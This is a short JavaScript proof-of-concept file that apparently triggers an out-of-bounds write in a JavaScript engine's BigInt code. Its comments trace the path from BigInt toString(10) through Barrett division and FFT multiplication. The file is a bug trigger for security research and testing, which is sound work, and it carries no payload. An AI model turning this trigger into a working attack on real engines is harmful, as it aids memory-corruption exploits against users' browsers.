// PoC for BigInt NormalizeAndRecombine OOB Write via toString
// ============================================================
// This PoC triggers the OOB via BigInt.prototype.toString(10) which
// goes through DivideBarrett -> Multiply -> MultiplyFFT -> NormalizeAndRecombine.
//
// Same instrumentation requirements as poc_bigint_division_oob.js

const x = 123456n;
const a = 31337n ** x;

// toString(10) triggers: ToString -> DivideBarrett -> Multiply -> FFT
const s = a.toString(10);

print("toString completed (if you see this, the OOB wasn't caught)");
